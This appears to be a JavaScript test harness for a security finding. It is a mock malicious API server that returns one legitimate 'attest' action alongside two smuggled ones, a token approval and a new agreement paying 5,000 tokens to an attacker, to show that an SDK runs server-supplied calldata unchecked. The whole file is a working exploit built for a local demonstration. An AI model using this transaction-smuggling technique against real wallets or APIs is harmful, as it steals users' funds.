// Mock Bull API server for B-08 — plays the role of a COMPROMISED / MALICIOUS Bull API.
// It answers the one endpoint the real Bull SDK uses in attest():
//   GET /api/v1/agreements/{id} -> status, conditions, each condition's actions
// The TAMPER: the victim calls bull.attest("1") to confirm delivery on agreement 1
// (a legit attest action by the victim). The server returns that legit action PLUS
// two extra actions, both named "attest" and from the victim, so they pass the
// SDK's only filter (from == me, name != "object"):
//   1. approve(USDC -> Agreement, 5,000)   — passes #guard: spender is the
//      Agreement contract and the amount is < 2**200.
//   2. createAgreement(payee=attacker, amount=5,000, condition attest-by-attacker)
//      — passes #guard: the call target IS the Agreement contract, value 0.
// #send() is called with the default maxWei=0 and no spenderOnly, and #guard never
// inspects calldata sent to a Bull contract at all — so the pair sails through.
// The victim intended a ZERO-VALUE, zero-fund-movement confirmation and instead
// locked 5,000 tokens into an attacker-controlled agreement. The attacker then
// attests and releases them to themselves.
// Note the live API's real action shape (GET /api/v1/agreements/9, round 2) is
// exactly {name, from, to, value, data, function, selector, abi} — to/data/value
// at the TOP level, which is what attest() passes straight to #send().
// The mock Agreement contract implements the DOCUMENTED semantics (llms.txt).
// No real Bull infrastructure; local Anvil only.
import http from "node:http";
import { encodeFunctionData, parseAbi, parseUnits } from "viem";

const AGREEMENT_ABI = parseAbi([
  "function createAgreement((address payee,address asset,uint256 amount,uint64 expiry,bytes32 termsHash) p, (uint8 kind,address by)[] conds) payable returns (uint256 id)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function attest(uint256 id, uint256 index)",
]);

// kind 1 = attest
const ATTEST = 1;

export function startMockApi({ port, agreement, usdc, attacker, victim }) {
  const server = http.createServer((req, res) => {
    const send = (obj) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(obj));
    };
    if (req.method === "GET" && req.url.startsWith("/api/v1/agreements/")) {
      const now = Math.floor(Date.now() / 1000);
      // The legit action the victim expects: attest agreement 1, condition 0.
      const legitAttest = {
        name: "attest",
        from: victim,
        to: agreement,
        value: "0",
        data: encodeFunctionData({ abi: AGREEMENT_ABI, functionName: "attest", args: [1n, 0n] }),
      };
      // SMUGGLED action 1: approve the Agreement to pull 5,000 tokens.
      const smuggledApprove = {
        name: "attest", // <-- server controls the name; "attest" passes the filter
        from: victim,
        to: usdc,
        value: "0",
        data: encodeFunctionData({
          abi: AGREEMENT_ABI, functionName: "approve",
          args: [agreement, parseUnits("5000", 18)],
        }),
      };
      // SMUGGLED action 2: create a NEW agreement paying 5,000 to the attacker,
      // releasable when the attacker attests.
      const params = {
        payee: attacker,
        asset: usdc,
        amount: parseUnits("5000", 18),
        expiry: BigInt(now + 72 * 3600),
        termsHash: "0xcf3cb940a68494b7e1a7432ee04b99982a19c6ca6abea314403e0ecfef12a4c2",
      };
      const smuggledCreate = {
        name: "attest", // <-- same trick
        from: victim,
        to: agreement,
        value: "0",
        data: encodeFunctionData({
          abi: AGREEMENT_ABI, functionName: "createAgreement",
          args: [params, [{ kind: ATTEST, by: attacker }]],
        }),
      };
      console.log("[mock-api] GET /api/v1/agreements/1 — returning 1 legit attest action + 2 SMUGGLED actions (approve + createAgreement to attacker)");
      send({
        id: "1",
        status: "open",
        conditions: [
          { index: 0, type: "attest", met: false, actions: [legitAttest, smuggledApprove, smuggledCreate] },
        ],
      });
      return;
    }
    res.writeHead(404, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "not found" }));
  });
  return new Promise((resolve) => server.listen(port, "127.0.0.1", () => resolve(server)));
}
